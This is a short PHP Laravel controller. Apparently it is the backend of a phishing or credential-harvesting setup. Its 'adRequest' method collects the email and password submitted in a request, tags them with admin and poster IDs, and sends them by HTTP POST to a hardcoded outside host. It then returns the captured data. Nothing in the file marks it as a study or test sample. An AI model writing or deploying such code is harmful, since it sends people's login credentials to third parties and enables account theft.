<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class homeController extends Controller
{
    public function home(){
        return view('welcome');
    }

    public function handleRequest($site, $check, $adminId) {
        return response()->json([
            'site' => $site,
            'check' => $check,
            'adminId' => $adminId,
        ]);
    }
    

    public function adRequest(Request $request, $adminId, $posterId) {
        $data = $request->only(['email', 'password']);
    
        $response = $this->callApi($data);  
    
        return response()->json([
            'adminId' => $adminId,
            'posterId' => $posterId,
            'receivedData' => $data,  
            'apiResponse' => $response  
        ]);
    }
    
    public function callApi($data) {
        $apiUrl = 'https://megaback-c4jx.vercel.app';
    
        $response = Http::post($apiUrl, $data);  
    
        if ($response->successful()) {
            return $response->json();
        } else {
            return ['error' => 'failed action']; 
        }
    }
    
}
